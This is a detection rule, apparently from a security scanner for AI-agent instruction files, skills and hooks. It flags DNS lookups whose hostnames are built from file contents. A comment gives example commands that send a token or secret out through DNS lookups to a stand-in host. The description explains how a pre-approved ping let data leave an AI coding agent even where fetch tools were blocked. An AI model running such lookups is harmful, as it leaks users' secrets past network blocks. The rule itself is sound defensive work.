rule as_0020_dns_lookup_with_substitution {
  meta:
    id          = 20
    title       = "DNS lookup whose name is built from file content"
    tier        = 1
    category    = "threat"
    severity    = "critical"
    class       = 4
    kinds       = "InstructionFile,Skill,Hook,Subagent,Plugin"
    status      = "probation"
    plain       = "This file builds an internet address out of the contents of a file on your machine, which sends the contents away as a lookup."
    description = "A DNS lookup (ping, nslookup, dig, host, whois) whose arguments carry a command substitution, in the $() or the backtick form, that reads file content: cat, head, base64, xxd, or the $(<file) shorthand. The lookup leaves the machine even where the fetch tools are blocked, which is how the pre-approved-ping exfiltration worked (CVE-2025-55284). A lookup of a name the shell already holds stays silent, dig $(hostname) and ping $HOST among them, and so does a plain lookup of a fixed host."
    references  = "https://embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests/ https://github.com/advisories/GHSA-x5gv-jw7f-j6xj"
    sensitive   = false

  strings:
    // ping -c 1 $(head -c 32 token).host.invalid, dig `cat secret`.host.invalid, whois "$(<file)"
    $dns_substitution = /\b(ping|nslookup|dig|host|whois)\s[^\n;|&]{0,160}(\$\(|`)\s*(cat|head|base64|xxd|<)/

  condition:
    item.file_type == "text" and $dns_substitution
}
